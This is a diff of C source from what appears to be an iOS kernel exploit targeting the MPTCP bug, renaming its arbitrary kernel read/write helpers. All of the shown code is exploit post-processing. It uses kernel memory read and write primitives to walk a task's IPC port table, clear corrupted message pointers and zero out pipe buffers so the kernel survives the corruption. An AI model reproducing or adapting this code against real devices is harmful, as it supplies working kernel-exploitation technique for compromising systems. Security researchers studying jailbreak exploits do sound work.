@@ -819,40 +819,40 @@ void mptcp_go() {
     // as a starting point we want the task port; we actually do know where this is because the exception messages contained it
     
     // for 1 & 3 we need to look through the task's mach port table
-    uint64_t task_kaddr = ReadAnywhere64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    uint64_t itk_space = ReadAnywhere64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
-    uint64_t is_table = ReadAnywhere64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
+    uint64_t task_kaddr = ReadKernel64(task_port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+    uint64_t itk_space = ReadKernel64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
+    uint64_t is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
     
-    uint32_t is_table_size = ReadAnywhere32(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
+    uint32_t is_table_size = ReadKernel32(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE_SIZE));
     
     const int sizeof_ipc_entry_t = 0x18;
     for (uint32_t i = 0; i < is_table_size; i++) {
-        uint64_t port_kaddr = ReadAnywhere64(is_table + (i * sizeof_ipc_entry_t));
+        uint64_t port_kaddr = ReadKernel64(is_table + (i * sizeof_ipc_entry_t));
         
         if (port_kaddr == 0) {
             continue;
         }
         
         // check the ikmq_base field
-        uint64_t kmsg = ReadAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
+        uint64_t kmsg = ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE));
         if (kmsg == pipe_buf) {
             // neuter it:
             LOG("clearing kmsg from port %016llx\n", port_kaddr);
-            WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
-            WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000);
+            WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IKMQ_BASE), 0);
+            WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_MSG_COUNT), 0x50000);
         }
         
         // check for a prealloced msg:
-        uint32_t ip_bits = ReadAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
+        uint32_t ip_bits = ReadKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS));
 #define  IP_BIT_PREALLOC    0x00008000
         if (ip_bits & IP_BIT_PREALLOC) {
-            uint64_t premsg = ReadAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG));
+            uint64_t premsg = ReadKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG));
             if (premsg == pipe_buf) {
                 // clear the premsg:
                 LOG("clearing premsg from port %016llx\n", port_kaddr);
-                WriteAnywhere64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG), 0);
+                WriteKernel64(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_PREMSG), 0);
                 ip_bits &= (~IP_BIT_PREALLOC);
-                WriteAnywhere32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), ip_bits);
+                WriteKernel32(port_kaddr + koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS), ip_bits);
             }
         }
     }
@@ -862,47 +862,47 @@ void mptcp_go() {
     // finally we have to fix up the pipe's buffer
     // for this we need to find the process fd table:
     // struct proc:
-    uint64_t proc_addr = ReadAnywhere64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
+    uint64_t proc_addr = ReadKernel64(task_kaddr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
     
     // struct filedesc
-    uint64_t filedesc = ReadAnywhere64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));
+    uint64_t filedesc = ReadKernel64(proc_addr + koffset(KSTRUCT_OFFSET_PROC_P_FD));
     
     // base of ofiles array
-    uint64_t ofiles_base = ReadAnywhere64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
+    uint64_t ofiles_base = ReadKernel64(filedesc + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
     
     uint64_t ofiles_offset = ofiles_base + (replacer_pipe * 8);
     
     // struct fileproc
-    uint64_t fileproc = ReadAnywhere64(ofiles_offset);
+    uint64_t fileproc = ReadKernel64(ofiles_offset);
     
     // struct fileglob
-    uint64_t fileglob = ReadAnywhere64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
+    uint64_t fileglob = ReadKernel64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
     
     // struct pipe
-    uint64_t pipe = ReadAnywhere64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
+    uint64_t pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
     
     // clear the inline struct pipebuf
     LOG("clearing pipebuf: %llx\n", pipe);
-    WriteAnywhere64(pipe + 0x00, 0);
-    WriteAnywhere64(pipe + 0x08, 0);
-    WriteAnywhere64(pipe + 0x10, 0);
+    WriteKernel64(pipe + 0x00, 0);
+    WriteKernel64(pipe + 0x08, 0);
+    WriteKernel64(pipe + 0x10, 0);
     
     // do the same for the other end:
     ofiles_offset = ofiles_base + ((replacer_pipe+1) * 8);
     
     // struct fileproc
-    fileproc = ReadAnywhere64(ofiles_offset);
+    fileproc = ReadKernel64(ofiles_offset);
     
     // struct fileglob
-    fileglob = ReadAnywhere64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
+    fileglob = ReadKernel64(fileproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
     
     // struct pipe
-    pipe = ReadAnywhere64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
+    pipe = ReadKernel64(fileglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
     
     LOG("clearing pipebuf: %llx\n", pipe);
-    WriteAnywhere64(pipe + 0x00, 0);
-    WriteAnywhere64(pipe + 0x08, 0);
-    WriteAnywhere64(pipe + 0x10, 0);
+    WriteKernel64(pipe + 0x00, 0);
+    WriteKernel64(pipe + 0x08, 0);
+    WriteKernel64(pipe + 0x10, 0);
     
     for (int i = 0; i < next_read_fd; i++) {
         close(write_fds[i]);
